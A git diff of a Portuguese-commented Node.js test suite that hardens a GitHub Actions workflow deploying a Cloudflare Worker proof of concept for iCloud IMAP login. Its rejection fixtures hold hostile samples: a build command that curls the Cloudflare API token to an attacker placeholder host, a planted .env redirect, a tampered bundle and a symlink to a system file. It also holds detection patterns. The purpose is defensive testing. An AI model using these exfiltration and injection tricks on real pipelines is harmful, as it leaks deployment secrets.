@@ -40,11 +40,15 @@ const SHA_NODE = "49933ea5288caeca8642d1e84afbd3f7d6820020";
 
 // ---------- estrutura e fronteiras de confiança ----------
 
-test("só dispara na mão, com uma única entrada (o commit da POC) e sem permissões por padrão", () => {
+test("só dispara na mão, com duas entradas (o commit da POC e a operação, uma lista fechada) e sem permissões por padrão", () => {
   assert.match(WF, /^on:\s*\n\s+workflow_dispatch:\s*\n\s+inputs:\s*\n\s+commit:\s*\n(?:\s+(?:description|required|type): .+\n)+/m);
-  assert.deepEqual([...WF.matchAll(/^      (\w+):\s*$/gm)].map((m) => m[1]).filter((n) => ["commit"].includes(n)), ["commit"]);
+  assert.deepEqual([...WF.matchAll(/^      (\w+):\s*$/gm)].map((m) => m[1]).filter((n) => ["commit", "operacao"].includes(n)), ["commit", "operacao"]);
   assert.match(WF, /required: true/);
   assert.match(WF, /type: string/);
+  const op = /^      operacao:\n((?:        .+\n)+)/m.exec(WF)[1];
+  assert.match(op, /default: validar_oidc/, "o padrão é a operação sem efeito e sem credencial");
+  assert.match(op, /type: choice/);
+  assert.deepEqual([...op.matchAll(/^          - (\w+)$/gm)].map((m) => m[1]), ["validar_oidc", "validar_uso_unico", "p1_imap"], "lista fechada");
   for (const x of [/\bpush:/, /\bpull_request/, /\bschedule:/, /\bcron:/, /\bworkflow_run:/, /\bworkflow_call:/, /\brepository_dispatch:/])
     assert.ok(!x.test(WF), "gatilho automático não permitido: " + x);
   assert.match(WF, /^permissions: \{\}\s*$/m);
@@ -66,7 +70,13 @@ test("a entrada commit só passa por env e por ref do checkout, e é validada (4
   assert.match(WF, /ref: \$\{\{ inputs\.commit \}\}/);
   assert.equal([...WF.matchAll(/^\s+COMMIT: \$\{\{ inputs\.commit \}\}\s*$/gm)].length, 3);
   assert.ok(nomeDe(PV[0]).startsWith("Só na main e com um commit válido"), "a validação é o primeiro passo");
-  assert.ok(!/inputs\./.test(J.provisionar) && !/inputs\./.test(J.executar), "só o job verificar usa a entrada");
+  assert.ok(!/inputs\./.test(J.provisionar), "o provisionar não usa nenhuma entrada");
+  assert.ok(!/inputs\.commit/.test(J.executar), "só o job verificar usa o commit");
+  // a operação só aparece em condições `if:` (nunca em script nem em env), onde é uma comparação com valor fixo da lista fechada
+  const usosOp = [...WF.matchAll(/inputs\.operacao/g)].length;
+  const emIf = [...WF.matchAll(/^        if: \$\{\{ inputs\.operacao == '(validar_uso_unico|p1_imap)' \}\}\s*$/gm)].length;
+  assert.equal(usosOp, 2);
+  assert.equal(emIf, 2);
 });
 
 test("o commit da POC é só dado: baixado à parte, em pasta própria, e nada dela é executado", () => {
@@ -89,8 +99,9 @@ test("o commit da POC é só dado: baixado à parte, em pasta própria, e nada d
   assert.ok(!/\bnpm (?:i|install|run|exec|test)\b|\bnpx\b/.test(WF));
 });
 
-test("secrets só existem em dois passos do job provisionar, que não executa nada vindo da branch", () => {
-  assert.ok(!/\bsecrets\./.test(J.verificar) && !/\bsecrets\./.test(J.executar), "verificar e executar não têm secrets");
+test("secrets da Cloudflare só existem em dois passos do job provisionar, que não executa nada vindo da branch", () => {
+  assert.ok(!/\bsecrets\./.test(J.verificar), "o verificar não tem secrets");
+  assert.ok(!/CLOUDFLARE_/.test(J.executar), "o executar não recebe credencial Cloudflare");
   assert.ok(!/secrets\./.test(J.provisionar.split(/^    steps:/m)[0]), "nenhum secret no cabeçalho do job");
   assert.ok(!/secrets\./.test(WF.split(/^jobs:/m)[0]), "nenhum secret no nível do workflow");
   const com = PP.filter(comSecret);
@@ -113,19 +124,84 @@ test("secrets só existem em dois passos do job provisionar, que não executa na
   for (const linha of J.provisionar.split("\n").filter((l) => /\bnode\b/.test(l) && !/node-version|^\s*-?\s*uses:/.test(l))) assert.match(linha, /wrangler\/bin\/wrangler\.js/, "o único uso de node é o Wrangler do lockfile");
 });
 
-test("job executar: Environment icloud-auth-poc, id-token só aqui, sem actions, checkout, Wrangler, secrets nem credencial Cloudflare", () => {
+test("job executar: Environment icloud-auth-poc, id-token só aqui, sem actions, checkout, Wrangler nem credencial Cloudflare", () => {
   assert.match(J.executar, /^    environment: icloud-auth-poc\s*$/m);
   assert.match(J.executar, /^    needs: provisionar\s*$/m);
   assert.match(J.executar, /^    permissions:\n      id-token: write\n    env:/m);
   assert.equal([...WF.matchAll(/id-token:\s*write/g)].length, 1);
   assert.ok(!/CLOUDFLARE_(?:API_TOKEN|ACCOUNT_ID)|wrangler|\buses:|checkout|contents:|\bnpm\b|\bnpx\b/i.test(J.executar));
-  assert.ok(!/\bsecrets\b/.test(J.executar) && !/\$\{\{/.test(J.executar.replace(/^\s*runs-on:.*$/m, "")));
-  assert.ok(!/ICLOUD|senha|usuario|password|PASSWORD/.test(WF), "nenhuma credencial Apple no workflow");
+  assert.ok(!/\$\{\{/.test(J.executar.replace(/^\s*runs-on:.*$/m, "").replace(/^        if: \$\{\{ inputs\.operacao == '\w+' \}\}\s*$/gm, "").replace(/^          ICLOUD_(?:USER|APP_PASSWORD): \$\{\{ secrets\.ICLOUD_(?:USER|APP_PASSWORD) \}\}\s*$/gm, "")), "só as condições if e os dois secrets do passo da P1 usam expressões");
   assert.match(J.executar, /--data '\{"operacao":"validar_oidc"\}'/);
   assert.match(J.executar, /^      WORKER_URL: https:\/\/rac-icloud-auth-poc\.[a-z0-9-]+\.workers\.dev\s*$/m);
-  assert.ok(!/echo[^\n]*\$\{?(JWT\b|ACTIONS_ID_TOKEN)/.test(J.executar.replace(/echo "::add-mask::\$JWT"/, "")));
-  assert.ok(J.executar.indexOf("::add-mask::$JWT") < J.executar.indexOf('"$WORKER_URL/auth-probe"'));
-  assert.match(J.executar, /unset JWT/);
+  assert.match(J.executar, /^      AUDIENCIA_PREFIXO: rac-inbox-icloud-poc\s*$/m);
+  assert.deepEqual(PE.map(nomeDe).map((n) => n.split(" (")[0].split(" —")[0]), ["Só na main", "Validar o JWT no Worker", "Prova sintética do uso único", "P1 IMAP"]);
+  for (const p of PE.slice(1)) {
+    const s = script(p);
+    assert.ok(!/echo[^\n]*\$\{?(JWT\b|ACTIONS_ID_TOKEN)/.test(s.replace(/echo "::add-mask::\$JWT"/g, "")), nomeDe(p) + ": o token nunca é impresso");
+    assert.ok(s.includes('echo "::add-mask::$JWT"'), nomeDe(p) + ": o token é mascarado");
+    assert.ok(!/(?:^|\s)-x\b|set -x/.test(s), "sem set -x");
+    for (const l of s.split("\n").filter((x) => /\bcurl\b/.test(x))) assert.ok(!/Authorization: Bearer \$/.test(l), "o token vai por substituição de processo, não por argumento: " + l.trim());
+  }
+  const pre = script(PE[1]);
+  assert.ok(pre.indexOf("::add-mask::$JWT") < pre.indexOf('"$WORKER_URL/auth-probe"'));
+  assert.match(pre, /unset JWT/);
+});
+
+test("pré-checagem: a única chamada com repetição é a sem efeito (validar_oidc); as operações protegidas nunca repetem sozinhas", () => {
+  const pre = script(PE[1]), sint = script(PE[2]), p1 = script(PE[3]);
+  assert.match(pre, /for TENTATIVA in 1 2 3 4 5; do/);
+  assert.match(pre, /--data '\{"operacao":"validar_oidc"\}'/);
+  for (const [nome, s] of [["prova sintética", sint], ["P1", p1]]) for (const x of [/for TENTATIVA/, /\bwhile\b/, /\buntil\b/, /\bsleep\b/, /--retry/, /\bTENTATIVA\b/]) assert.ok(!x.test(s), nome + ": sem repetição automática: " + x);
+});
+
+test("prova sintética do uso único: sem credencial, dez chamadas simultâneas, exatamente uma aceita e nove recusadas, mais o replay do mesmo token e de um token novo", () => {
+  const passo = PE[2], s = script(passo);
+  assert.match(passo, /^        if: \$\{\{ inputs\.operacao == 'validar_uso_unico' \}\}\s*$/m);
+  assert.ok(!comSecret(passo) && !/ICLOUD|senha|usuario|password/i.test(passo), "nenhuma credencial");
+  assert.match(s, /N=10/);
+  assert.match(s, /chamar "\$D\/c\$I" "\$\{TOKENS\[\$I\]\}" &/);
+  assert.match(s, /^wait$/m);
+  assert.match(s, /\[ "\$ACEITAS" = "1" \] && \[ "\$REPETIDAS" = "\$\(\(N - 1\)\)" \] && \[ "\$OUTRAS" = "0" \] && \[ "\$R1" = "409" \] && \[ "\$R2" = "409" \]/);
+  assert.match(s, /--data '\{"operacao":"validar_uso_unico"\}'/);
+  assert.match(s, /audience=\$AUDIENCIA_PREFIXO:validar_uso_unico/);
+  assert.match(s, /exit 1\s*$/);
+  assert.match(s, /jq -c '\{ok, erro, motivo, detalhe\}'/, "o resumo só mostra campos fixos da resposta");
+});
+
+test("P1: uma única chamada, credencial só dos secrets do Environment, por entrada padrão; nunca em argumento, arquivo, artefato, output ou log", () => {
+  const passo = PE[3], s = script(passo);
+  assert.match(passo, /^        if: \$\{\{ inputs\.operacao == 'p1_imap' \}\}\s*$/m);
+  // os secrets Apple só existem neste passo, no env dele, e são exatamente dois
+  assert.ok(!PE.slice(0, 3).some((p) => /secrets\./.test(p)), "nenhum outro passo recebe secrets");
+  const env = /\n        env:\n((?:          .+\n)+)/.exec(passo)[1];
+  assert.deepEqual([...env.matchAll(/^          (\w+): \$\{\{ secrets\.(\w+) \}\}$/gm)].map((m) => m[1] + "=" + m[2]), ["ICLOUD_USER=ICLOUD_USER", "ICLOUD_APP_PASSWORD=ICLOUD_APP_PASSWORD"]);
+  assert.equal([...env.matchAll(/^          \w+:/gm)].length, 2);
+  // exatamente UMA chamada ao Worker
+  assert.equal([...s.matchAll(/\$WORKER_URL\/auth-probe/g)].length, 1);
+  assert.equal([...s.matchAll(/curl -sS -m 40 -o "\$RESP"/g)].length, 1);
+  // a credencial entra no corpo por entrada padrão, lida do ambiente pelo jq (nunca por argumento do jq nem do curl)
+  assert.match(s, /jq -n '\{operacao: "p1_imap", usuario: env\.ICLOUD_USER, senha: env\.ICLOUD_APP_PASSWORD\}' \| curl /);
+  assert.match(s, /--data-binary @-/);
+  for (const l of s.split("\n")) {
+    if (/ICLOUD_(?:USER|APP_PASSWORD)/.test(l)) assert.ok(!/\b(?:echo|printf|cat|tee|curl|export|GITHUB_OUTPUT|GITHUB_ENV|GITHUB_STEP_SUMMARY)\b/.test(l) || /^\s*if \[ -z/.test(l) || /::error::/.test(l) || /\| curl/.test(l) || /^\s*unset /.test(l), "credencial em linha suspeita: " + l.trim());
+    assert.ok(!/--data(?:-raw|-urlencode)? ['"]?[^@'" ]*\$ICLOUD/.test(l) && !/\$\{?ICLOUD_(?:USER|APP_PASSWORD)\}?.*\bcurl\b|\bcurl\b.*\$\{?ICLOUD_(?:USER|APP_PASSWORD)/.test(l.replace(/\| curl/, "")), "credencial em argumento: " + l.trim());
+  }
+  assert.ok(!/GITHUB_OUTPUT|GITHUB_ENV|upload-artifact|\bcache@|>>\s*"?\$RUNNER_TEMP|> *"\$RUNNER_TEMP\/[^"]*(?:senha|cred)/.test(s), "nada de output, arquivo ou artefato com a credencial");
+  assert.match(s, /unset JWT ICLOUD_USER ICLOUD_APP_PASSWORD/);
+  assert.ok(s.indexOf("::add-mask::$JWT") < s.indexOf('"$WORKER_URL/auth-probe"'));
+  // segredos ausentes: interrompe só a P1, com instrução e sem pedir valor
+  assert.match(s, /if \[ -z "\$ICLOUD_USER" \] \|\| \[ -z "\$ICLOUD_APP_PASSWORD" \]; then[\s\S]*?exit 1/);
+  assert.match(s, /nunca no chat/);
+  // o resumo só mostra os campos permitidos do esquema fechado
+  assert.match(s, /jq '\{ok, operacao, estagio, autenticado, logout, erro, motivo, detalhe, capabilities, pastas, pasta_teste_existe\}'/);
+  assert.match(s, /jq -e '\.ok == true and \.autenticado == true'/);
+  assert.match(s, /Nenhuma nova tentativa é feita/);
+});
+
+test("a credencial Apple nunca é citada fora do passo da P1 (nem nos jobs verificar e provisionar, nem em cabeçalho do workflow)", () => {
+  const fora = WF.replace(PE[3], "").replace(/^      operacao:\n(?:        .+\n)+/m, ""); // a descrição da entrada "operacao" só informa o nome dos secrets
+  assert.ok(!/ICLOUD_(?:USER|APP_PASSWORD)\b/.test(fora.replace(/#.*$/gm, "")), "só o passo da P1 usa os secrets");
+  assert.ok(!/senha|password/i.test(J.verificar) && !/senha|password/i.test(J.provisionar));
 });
 
 test("nada sensível passa entre os jobs: só commit, hash e pacote públicos vão de verificar para provisionar; executar não lê nada", () => {
@@ -160,20 +236,32 @@ test("actions oficiais fixadas por SHA (conferidos nos repositórios oficiais) e
   assert.deepEqual(fs.readdirSync(new URL(dir, raiz)).sort(), ["README.md", "package-lock.json", "package.json"]);
 });
 
-test("integridade do pacote: lista fixa, config única escrita no workflow, dry-run, inspeção, sha256 e publicação do mesmo arquivo sem bundle", () => {
+const ARQS_WORKER = ["politica", "jwt", "jwks", "consumo", "imap", "rotas", "index"];
+const CFG_FIXA = { name: "rac-icloud-auth-poc", main: "src/index.mjs", compatibility_date: "2026-11-13", workers_dev: true, observability: { enabled: false },
+  durable_objects: { bindings: [{ name: "CONSUMO", class_name: "ConsumoUnico" }] }, migrations: [{ tag: "v1", new_sqlite_classes: ["ConsumoUnico"] }] };
+
+test("integridade do pacote: lista fixa, config única escrita no workflow (com o Durable Object), dry-run, inspeção, sha256 e publicação do mesmo arquivo sem bundle", () => {
   const montar = achar(PV, "Montar o pacote");
-  assert.match(montar, /ESPERADO=\$'\.\/README\.md\\n\.\/src\/index\.mjs\\n\.\/src\/jwks\.mjs\\n\.\/src\/jwt\.mjs\\n\.\/src\/politica\.mjs\\n\.\/wrangler\.jsonc'/);
+  assert.match(montar, /ESPERADO=\$'\.\/README\.md\\n\.\/src\/consumo\.mjs\\n\.\/src\/imap\.mjs\\n\.\/src\/index\.mjs\\n\.\/src\/jwks\.mjs\\n\.\/src\/jwt\.mjs\\n\.\/src\/politica\.mjs\\n\.\/src\/rotas\.mjs\\n\.\/wrangler\.jsonc'/);
   assert.match(montar, /find "\$BASE" -type l/);
-  assert.match(montar, /for ARQ in politica jwt jwks index; do cp "\$BASE\/src\/\$ARQ\.mjs"/);
+  assert.match(montar, /for ARQ in politica jwt jwks consumo imap rotas index; do cp "\$BASE\/src\/\$ARQ\.mjs"/);
   const heredoc = (j) => JSON.parse(new RegExp("<<'JSON'\\n([\\s\\S]*?)\\n\\s*JSON\\n").exec(j)[1].replace(/^\s{10}/gm, ""));
   const cfgV = heredoc(J.verificar), cfgP = heredoc(J.provisionar);
-  assert.deepEqual(Object.keys(cfgV).sort(), ["compatibility_date", "main", "name", "observability", "workers_dev"], "nenhuma chave executável ou de armazenamento");
-  assert.deepEqual(cfgP, { name: cfgV.name, compatibility_date: cfgV.compatibility_date, workers_dev: cfgV.workers_dev, observability: cfgV.observability });
+  assert.deepEqual(cfgV, CFG_FIXA, "a configuração fixa do verificar é exatamente esta (Durable Object CONSUMO com SQLite e migração v1; nenhuma outra chave)");
+  const { main, ...semMain } = CFG_FIXA;
+  assert.deepEqual(cfgP, semMain, "o provisionar usa a mesma configuração, sem main (que vira o arquivo conferido)");
+  assert.deepEqual(Object.keys(cfgV).sort(), ["compatibility_date", "durable_objects", "main", "migrations", "name", "observability", "workers_dev"], "nenhuma chave executável, de rota, de variável ou de armazenamento além do Durable Object");
   assert.match(J.provisionar, /jq --arg main "\$DEST\/index\.js" '\. \+ \{main: \$main, no_bundle: true\}'/);
   const emp = achar(PV, "Empacotar");
   assert.match(emp, /deploy --dry-run --outdir/);
-  for (const padrao of [String.raw`process\.env`, String.raw`eval\(`, "new Function", "cloudflare:", String.raw`imap\.mail\.me\.com`, String.raw`smtp\.mail\.me\.com`, String.raw`import\(`, String.raw`require\(`, String.raw`console\.`]) assert.ok(emp.includes("'" + padrao + "'"), "inspeção: " + padrao);
-  assert.match(emp, /"\$HOSTS" != "https:\/\/token\.actions\.githubusercontent\.com"/);
+  for (const padrao of [String.raw`process\.env`, String.raw`eval\(`, "new Function", String.raw`smtp\.mail\.me\.com`, String.raw`import\(`, String.raw`require\(`, String.raw`console\.`]) assert.ok(emp.includes("'" + padrao + "'"), "inspeção: " + padrao);
+  assert.ok(!emp.includes("'cloudflare:'") && !emp.includes(String.raw`'imap\.mail\.me\.com'`), "as proibições totais antigas foram trocadas por listas exatas");
+  assert.match(emp, /MODULOS=\$\(grep -oE 'cloudflare:\[a-z\]\+' "\$BUNDLE" \| sort -u\)/);
+  assert.match(emp, /"\$MODULOS" != "cloudflare:sockets"/);
+  assert.match(emp, /"\$APPLE" != "imap\.mail\.me\.com"/);
+  assert.match(emp, /grep -qwE 'EXPUNGE\|APPEND\|FETCH\|STORE\|EXAMINE\|SEARCH\|RENAME\|SUBSCRIBE\|AUTHENTICATE\|STARTTLS'/);
+  assert.match(emp, /"\$HOSTS" != \$'https:\/\/consumo\.interno\\nhttps:\/\/token\.actions\.githubusercontent\.com'/);
+  assert.match(emp, /grep -qE '\^var ConsumoUnico = class'/);
   assert.match(emp, /sha256sum "\$BUNDLE"/);
   assert.match(emp, /Antes de aprovar/);
   const rec = achar(PP, "Reconstituir");
@@ -195,13 +283,13 @@ test("um único caminho de publicação privilegiada: nenhum outro workflow usa 
 const TMPS = [];
 function tmp() { const d = fs.mkdtempSync(path.join(os.tmpdir(), "rac-wf-")); TMPS.push(d); return d; }
 process.on("exit", () => { for (const d of TMPS) fs.rmSync(d, { recursive: true, force: true }); });
-const CFG = { $schema: "node_modules/wrangler/config-schema.json", name: "rac-icloud-auth-poc", main: "src/index.mjs", compatibility_date: "2026-11-13", workers_dev: true, observability: { enabled: false } };
+const CFG = { $schema: "node_modules/wrangler/config-schema.json", ...CFG_FIXA };
 function fixture({ extra = {}, cfg = CFG } = {}) {
   const ws = tmp(), base = path.join(ws, "poc/experimentos/icloud-auth-probe");
   fs.mkdirSync(path.join(base, "src"), { recursive: true });
   fs.writeFileSync(path.join(base, "README.md"), "# poc\n");
   fs.writeFileSync(path.join(base, "wrangler.jsonc"), JSON.stringify(cfg, null, 2));
-  for (const n of ["politica", "jwt", "jwks", "index"]) fs.writeFileSync(path.join(base, "src", n + ".mjs"), "export const " + n + " = 1;\n");
+  for (const n of ARQS_WORKER) fs.writeFileSync(path.join(base, "src", n + ".mjs"), "export const " + n + " = 1;\n");
   for (const [rel, conteudo] of Object.entries(extra)) { fs.mkdirSync(path.dirname(path.join(base, rel)), { recursive: true }); fs.writeFileSync(path.join(base, rel), conteudo); }
   const env = { ...process.env, GIT_AUTHOR_NAME: "t", GIT_AUTHOR_EMAIL: "t@example.test", GIT_COMMITTER_NAME: "t", GIT_COMMITTER_EMAIL: "t@example.test" };
   const g = (...a) => spawnSync("git", ["-C", path.join(ws, "poc"), ...a], { env, encoding: "utf8" });
@@ -231,9 +319,10 @@ test("EXECUÇÃO — montagem do pacote: aceita só a lista fixa de arquivos reg
   const r = rodar(passo, { cwd: bom.ws, env: { COMMIT: bom.commit } });
   assert.equal(r.status, 0, r.stderr);
   const pacote = path.join(r.tempDir, "pacote");
-  assert.deepEqual(fs.readdirSync(path.join(pacote, "src")).sort(), ["index.mjs", "jwks.mjs", "jwt.mjs", "politica.mjs"]);
-  assert.deepEqual(JSON.parse(fs.readFileSync(path.join(pacote, "wrangler.jsonc"), "utf8")), { name: CFG.name, main: CFG.main, compatibility_date: CFG.compatibility_date, workers_dev: true, observability: { enabled: false } });
-  assert.match(fs.readFileSync(path.join(r.tempDir, "fontes.sha256"), "utf8"), /src\/index\.mjs/);
+  assert.deepEqual(fs.readdirSync(path.join(pacote, "src")).sort(), ["consumo.mjs", "imap.mjs", "index.mjs", "jwks.mjs", "jwt.mjs", "politica.mjs", "rotas.mjs"]);
+  assert.deepEqual(JSON.parse(fs.readFileSync(path.join(pacote, "wrangler.jsonc"), "utf8")), CFG_FIXA);
+  const fontes = fs.readFileSync(path.join(r.tempDir, "fontes.sha256"), "utf8");
+  for (const n of ARQS_WORKER) assert.match(fontes, new RegExp("src/" + n + "\\.mjs"));
   const recusar = (nome, f, env) => { const x = rodar(passo, { cwd: f.ws, env: { COMMIT: f.commit, ...env } }); assert.notEqual(x.status, 0, nome); return x; };
   recusar("arquivo .env escondido", fixture({ extra: { ".env": "CLOUDFLARE_API_BASE_URL=https://atacante.exemplo\n" } }));
   recusar(".dev.vars", fixture({ extra: { ".dev.vars": "X=1\n" } }));
@@ -242,6 +331,14 @@ test("EXECUÇÃO — montagem do pacote: aceita só a lista fixa de arquivos reg
   recusar("arquivo extra em src", fixture({ extra: { "src/extra.mjs": "export {};\n" } }));
   recusar("build.command na config", fixture({ cfg: { ...CFG, build: { command: "curl https://atacante.exemplo/$CLOUDFLARE_API_TOKEN" } } }));
   recusar("vars na config", fixture({ cfg: { ...CFG, vars: { X: "1" } } }));
+  recusar("KV na config", fixture({ cfg: { ...CFG, kv_namespaces: [{ binding: "K", id: "x" }] } }));
+  recusar("segundo Durable Object", fixture({ cfg: { ...CFG, durable_objects: { bindings: [...CFG.durable_objects.bindings, { name: "OUTRO", class_name: "Outro" }] } } }));
+  recusar("classe do Durable Object diferente", fixture({ cfg: { ...CFG, durable_objects: { bindings: [{ name: "CONSUMO", class_name: "OutraClasse" }] } } }));
+  recusar("migração com armazenamento clássico (sem SQLite)", fixture({ cfg: { ...CFG, migrations: [{ tag: "v1", new_classes: ["ConsumoUnico"] }] } }));
+  recusar("migração que apaga a classe", fixture({ cfg: { ...CFG, migrations: [...CFG.migrations, { tag: "v2", deleted_classes: ["ConsumoUnico"] }] } }));
+  recusar("sem o Durable Object na config", fixture({ cfg: (({ durable_objects, migrations, ...resto }) => resto)(CFG) }));
+  const faltando = fixture(); fs.rmSync(path.join(faltando.base, "src/imap.mjs")); spawnSync("git", ["-C", path.join(faltando.ws, "poc"), "add", "-A"]); 
+  recusar("arquivo da lista fixa ausente", faltando);
   recusar("outra rota na config", fixture({ cfg: { ...CFG, routes: ["x.exemplo/*"] } }));
   const comLink = fixture();
   fs.rmSync(path.join(comLink.base, "src/index.mjs")); fs.symlinkSync("/etc/hostname", path.join(comLink.base, "src/index.mjs"));
@@ -262,7 +359,9 @@ test("EXECUÇÃO — reconstituição: publica só o arquivo cujo sha256 confere
   const publicar = path.join(ok.tempDir, "publicar");
   assert.equal(fs.readFileSync(path.join(publicar, "index.js"), "utf8"), conteudo.toString());
   const cfg = JSON.parse(fs.readFileSync(path.join(publicar, "wrangler.publicar.jsonc"), "utf8"));
-  assert.deepEqual(Object.keys(cfg).sort(), ["compatibility_date", "main", "name", "no_bundle", "observability", "workers_dev"]);
+  assert.deepEqual(Object.keys(cfg).sort(), ["compatibility_date", "durable_objects", "main", "migrations", "name", "no_bundle", "observability", "workers_dev"]);
+  assert.deepEqual(cfg.durable_objects, CFG_FIXA.durable_objects);
+  assert.deepEqual(cfg.migrations, CFG_FIXA.migrations);
   assert.equal(cfg.no_bundle, true);
   assert.equal(cfg.main, path.join(publicar, "index.js"), "publica exatamente o arquivo conferido");
   const adulterado = Buffer.from("export default { fetch() { return fetch('https://atacante.exemplo'); } };\n");
@@ -276,10 +375,62 @@ test("EXECUÇÃO — reconstituição: publica só o arquivo cujo sha256 confere
   }
 });
 
+// inspeção do pacote: o passo "Empacotar" EXECUTADO de verdade, com um wrangler de mentira que só grava o bundle que o teste escolhe
+const BUNDLE_BOM = [
+  'var __defProp = Object.defineProperty;',
+  'import { connect } from "cloudflare:sockets";',
+  'var POLITICA = Object.freeze({ issuer: "https://token.actions.githubusercontent.com", imap: { host: "imap.mail.me.com", porta: 993 } });',
+  'var ConsumoUnico = class {',
+  '  async fetch(request) { return new Response("{}"); }',
+  '};',
+  'function pedir(stub) { return stub.fetch("https://consumo.interno/consumir", { method: "POST" }); }',
+  'async function login(s) { return s.write("a1 LOGIN x y"); }',
+  'export {',
+  '  ConsumoUnico,',
+  '  index_default as default',
+  '};',
+  '',
+].join("\n");
+function rodarEmpacotar(bundle, { extraDist } = {}) {
+  const ws = tmp(), temp = tmp();
+  const fake = path.join(ws, "experimentos/icloud-auth-probe-ferramenta/node_modules/wrangler/bin");
+  fs.mkdirSync(fake, { recursive: true });
+  fs.writeFileSync(path.join(fake, "wrangler.js"), 'const fs=require("fs"),p=require("path");const o=process.argv[process.argv.indexOf("--outdir")+1];fs.mkdirSync(o,{recursive:true});fs.writeFileSync(p.join(o,"index.js"),fs.readFileSync(process.env.BUNDLE_FALSO));' + (extraDist ? 'fs.writeFileSync(p.join(o,' + JSON.stringify(extraDist) + '),"x");' : ""));
+  fs.mkdirSync(path.join(temp, "pacote"), { recursive: true });
+  fs.writeFileSync(path.join(temp, "fontes.sha256"), "00  ./README.md\n");
+  const arq = path.join(temp, "bundle-falso.js");
+  fs.writeFileSync(arq, bundle);
+  const r = spawnSync("bash", ["-e", "-o", "pipefail", "-c", script(achar(PV, "Empacotar"))], { cwd: ws, encoding: "utf8", env: { PATH: process.env.PATH, HOME: temp, RUNNER_TEMP: temp, GITHUB_WORKSPACE: ws, GITHUB_STEP_SUMMARY: path.join(temp, "resumo.md"), GITHUB_OUTPUT: path.join(temp, "saida.txt"), COMMIT: "a".repeat(40), BUNDLE_FALSO: arq } });
+  return { ...r, temp };
+}
+
+test("EXECUÇÃO — inspeção do pacote: aceita o bundle esperado (sockets, host IMAP, Durable Object exportado) e recusa tudo o que sair da lista exata", { skip: semFerramentas }, () => {
+  const ok = rodarEmpacotar(BUNDLE_BOM);
+  assert.equal(ok.status, 0, ok.stderr);
+  const saida = fs.readFileSync(path.join(ok.temp, "saida.txt"), "utf8");
+  assert.match(saida, /^commit=a{40}$/m);
+  assert.match(saida, /^sha256=[0-9a-f]{64}$/m);
+  assert.match(fs.readFileSync(path.join(ok.temp, "resumo.md"), "utf8"), /Durable Object CONSUMO/);
+  const ruins = [
+    ["process.env", BUNDLE_BOM + "var a = process.env.X;\n"], ["eval", BUNDLE_BOM + "eval(x);\n"], ["new Function", BUNDLE_BOM + "new Function('x');\n"],
+    ["console", BUNDLE_BOM + "console.log(1);\n"], ["import dinâmico", BUNDLE_BOM + "import('x');\n"], ["require", BUNDLE_BOM + "require('x');\n"],
+    ["SMTP", BUNDLE_BOM + 'var s = "smtp.mail.me.com";\n'], ["outro host da Apple", BUNDLE_BOM + 'var s = "pop.mail.me.com";\n'],
+    ["outro módulo cloudflare:", BUNDLE_BOM + 'import { env } from "cloudflare:workers";\n'], ["sem sockets", BUNDLE_BOM.replace('import { connect } from "cloudflare:sockets";\n', "")],
+    ["host http estranho", BUNDLE_BOM + 'var u = "https://atacante.exemplo/x";\n'], ["host http interno trocado", BUNDLE_BOM.replace("https://consumo.interno", "https://outro.interno")],
+    ["sem o objeto interno", BUNDLE_BOM.replace('"https://consumo.interno/consumir"', '"x"')],
+    ["classe do Durable Object ausente", BUNDLE_BOM.replace("var ConsumoUnico = class {", "var Outra = class {")], ["classe não exportada", BUNDLE_BOM.replace("  ConsumoUnico,\n", "")],
+    ...["EXPUNGE", "APPEND", "FETCH", "STORE", "EXAMINE", "SEARCH", "RENAME", "SUBSCRIBE", "AUTHENTICATE", "STARTTLS"].map((v) => ["verbo IMAP " + v, BUNDLE_BOM + 'var v = "a2 ' + v + ' 1";\n']),
+  ];
+  for (const [nome, bundle] of ruins) assert.notEqual(rodarEmpacotar(bundle).status, 0, nome);
+  assert.notEqual(rodarEmpacotar(BUNDLE_BOM, { extraDist: "extra.txt" }).status, 0, "arquivo inesperado no pacote gerado");
+  assert.equal(rodarEmpacotar(BUNDLE_BOM, { extraDist: "index.js.map" }).status, 0, "o mapa de fontes continua permitido");
+});
+
 // ---------- coerência com a política do Worker e com a documentação ----------
 
 const temWorker = existe("experimentos/icloud-auth-probe/src/politica.mjs");
-test("o Worker (quando presente) só aceita tokens da main, do workflow deste arquivo e do Environment icloud-auth-poc", { skip: !temWorker && "o código do Worker está na branch da POC e chega à main com a PR dela" }, async () => {
+const workerNovo = temWorker && existe("experimentos/icloud-auth-probe/src/consumo.mjs");
+test("o Worker (quando a versão com replay + P1 está presente) só aceita tokens da main, do workflow deste arquivo e do Environment icloud-auth-poc, com a mesma configuração", { skip: !workerNovo && "o código do Worker está na branch da POC e chega à main com a PR dela" }, async () => {
   const { POLITICA, workflowRefEsperado, audienciasPermitidas } = await import("../experimentos/icloud-auth-probe/src/politica.mjs");
   assert.deepEqual(POLITICA.refsPermitidos, ["refs/heads/main"]);
   assert.equal(workflowRefEsperado(POLITICA.refsPermitidos[0]), POLITICA.repository + "/.github/workflows/icloud-auth-probe.yml@refs/heads/main");
@@ -287,7 +438,18 @@ test("o Worker (quando presente) só aceita tokens da main, do workflow deste ar
   assert.deepEqual(POLITICA.eventosPermitidos, ["workflow_dispatch"]);
   assert.equal(POLITICA.environment, "icloud-auth-poc");
   assert.match(J.executar, new RegExp("^    environment: " + POLITICA.environment + "\\s*$", "m"));
-  assert.deepEqual(audienciasPermitidas(), [/AUDIENCIA: (\S+)/.exec(J.executar)[1]]);
+  const prefixo = /AUDIENCIA_PREFIXO: (\S+)/.exec(J.executar)[1] + ":";
+  assert.equal(prefixo, POLITICA.audienciaPrefixo);
+  // toda operação da política tem o passo correspondente no workflow, e vice-versa
+  assert.deepEqual(POLITICA.operacoes, ["validar_oidc", "validar_uso_unico", "p1_imap"]);
+  for (const op of POLITICA.operacoes.filter((o) => o !== "validar_oidc")) assert.ok(J.executar.includes("inputs.operacao == '" + op + "'"), "passo ausente para " + op);
+  assert.deepEqual(audienciasPermitidas(), POLITICA.operacoes.map((o) => POLITICA.audienciaPrefixo + o));
+  // a configuração fixa do workflow é a wrangler.jsonc do Worker (Durable Object e migração incluídos)
+  const cfg = JSON.parse(ler("experimentos/icloud-auth-probe/wrangler.jsonc")); delete cfg.$schema;
+  assert.deepEqual(cfg, CFG_FIXA);
+  // a lista fixa do workflow é exatamente a pasta do Worker
+  const lista = fs.readdirSync(new URL("experimentos/icloud-auth-probe/src/", raiz)).map((f) => f.replace(/\.mjs$/, "")).sort();
+  assert.deepEqual(lista, [...ARQS_WORKER].sort());
 });
 
